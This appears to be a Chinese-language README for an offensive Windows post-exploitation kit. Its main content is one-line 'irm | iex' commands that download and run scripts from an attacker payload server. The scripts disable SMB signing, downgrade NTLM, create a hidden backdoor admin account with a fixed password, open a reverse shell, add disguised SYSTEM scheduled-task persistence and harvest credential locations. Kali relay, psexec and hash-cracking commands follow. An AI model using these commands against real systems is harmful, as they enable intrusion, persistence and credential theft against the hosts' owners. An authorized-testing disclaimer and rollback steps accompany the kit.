# win-surface-arsenal

> Windows 人为制造攻击面 / 后门化 载荷仓库
> 仅用于**自有环境、授权演练、靶场复现**。所有脚本均附回滚，落地后请按需清理。

面向场景：已在目标 Windows 主机取得**管理员执行权**（RDP/横向/钓鱼落地），需要快速把主机改造成可被远程利用、可被中继、可持久化的"活靶子"，并留下可复现文档。

---

## 一键命令（irm | iex，载荷服务：`http://<LOADER_IP>:8090/`）

把 `LOADER_IP` 换成你的载荷服务器（本仓库脚本可用 `python3 -m http.server 8090` 直接托管）。

### 1. 全量开洞（推荐起点）
```powershell
powershell -ep bypass -c "irm http://LOADER_IP:8090/combined/open_attack_surface.ps1 | iex"
```
包含：SMB1 启用 · 关闭 SMB 签名 · 匿名/来宾访问 · NTLM 降级 · 防火墙放行 · RDP(关NLA) · WinRM(Basic) · 关闭 UAC 远程限制 · 后门账号 · 可写共享。

### 2. 最小开洞（低特征）
```powershell
irm http://LOADER_IP:8090/smb/smb_minimal.ps1 | iex
```

### 3. 只要后门账号
```powershell
irm http://LOADER_IP:8090/credentials/backdoor_user.ps1 | iex
# 账号: svc_diag$ / P@ssw0rd!2024（管理员 + 远程桌面 + 登录界面隐藏）
```

### 4. 开 RDP / WinRM
```powershell
irm http://LOADER_IP:8090/rdp/rdp_enable.ps1 | iex
irm http://LOADER_IP:8090/winrm/winrm_enable.ps1 | iex
```

### 5. NTLM 降级（让抓到的哈希可秒破）
```powershell
irm http://LOADER_IP:8090/credentials/ntlm_downgrade.ps1 | iex -Level 2
```

### 6. 反向 shell（先在你机器上 `nc -lvnp 4444`）
```powershell
irm http://LOADER_IP:8090/persistence/reverse_shell.ps1 | iex
```

### 7. 持久化（SYSTEM 计划任务，开机+登录触发）
```powershell
irm http://LOADER_IP:8090/persistence/persist_task.ps1 | iex
```

### 8. 落地侦察（主机/补丁/网段/高价值文件/浏览器凭据位置/WiFi 明文）
```powershell
irm http://LOADER_IP:8090/recon/recon_sweep.ps1 | iex
```

### 9. 全量回滚
```powershell
irm http://LOADER_IP:8090/combined/open_attack_surface.ps1 -OutFile open.ps1
powershell -ep bypass -File .\open.ps1 -Revert
```

### 10. 纯 CMD 环境（无 PowerShell 的 irm）
```bat
smb\smb_open_backdoor.bat      :: 开洞
smb\revert_smb.bat             :: 回滚
```

---

## 目录结构

```
win-surface-arsenal/
├── smb/            SMB 攻击面（开洞 / 最小面 / 回滚）
├── rdp/            远程桌面（开 RDP + 关 NLA）
├── winrm/          WinRM（Basic + AllowUnencrypted）
├── credentials/    凭据面（后门账号 / NTLM 降级）
├── persistence/    持久化（反向 shell / 计划任务）
├── firewall/       防火墙放行（含全局关闭开关）
├── recon/          落地侦察脚本
├── combined/       组合载荷 + irm 速查表 + 自提升
└── docs/           实战分析报告（局域网画像 / 复盘 / CVE 核对）
```

## 配套攻击侧（Kali）

```bash
# 验证开洞成功
netexec smb <IP> -u 'svc_diag$' -p 'P@ssw0rd!2024' --shares --smb-timeout 10

# SYSTEM shell
impacket-psexec 'svc_diag$:P@ssw0rd!2024@<IP>'

# 全盘读取
smbclient //<IP>/C$ -U 'svc_diag$%P@ssw0rd!2024'

# 中继（需签名关闭）
impacket-ntlmrelayx -tf targets.txt -smb2support -socks \
  --http-port 18080 --no-rpc-server --no-wcf-server --no-winrm-server

# 哈希破解
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt --rules=Best64
```

## 关键点说明

| 配置 | 为什么 |
|---|---|
| 关闭 SMB 签名 | NTLM 中继的前提；签名强制时中继必然失败 |
| SMB1 启用 | 老协议面（部分中继/工具链依赖），也让 `LmCompatibilityLevel` 降级更彻底 |
| AllowInsecureGuestAuth + RestrictNullSessAccess=0 | 免凭据列共享/读文件 |
| LmCompatibilityLevel=2 | 抓到 NTLMv1，`john --format=netntlm` 分钟级破解，破出即 NT hash 可 PtH |
| LocalAccountTokenFilterPolicy=1 | 本地管理员账号可远程使用（psexec 关键，否则 UAC 远程过滤会降权） |
| RDP 关 NLA | 老工具（xfreerdp/rdesktop）与口令直连可用 |
| WinRM Basic + AllowUnencrypted | evil-winrm / impacket-wmiexec 类工具直连 |

## 风险与清理

- 后门账号、关闭防火墙、开 RDP 属**高特征**改动，EDR/审计会记录（事件 4720 建号、4728 加组、4946 防火墙规则变更）。
- 演练收尾务必执行回滚脚本，并清理：计划任务 `WinUpdHealthCheck`、共享 `SYSVOL_CACHE`、账号 `svc_diag$`。
- 本仓库不含任何二进制木马，仅含配置类载荷；二进制请自行按需放置于 `assets/`（不入库）。

## 免责

仅限自建实验环境与书面授权范围内的安全测试。使用者对一切后果负责。
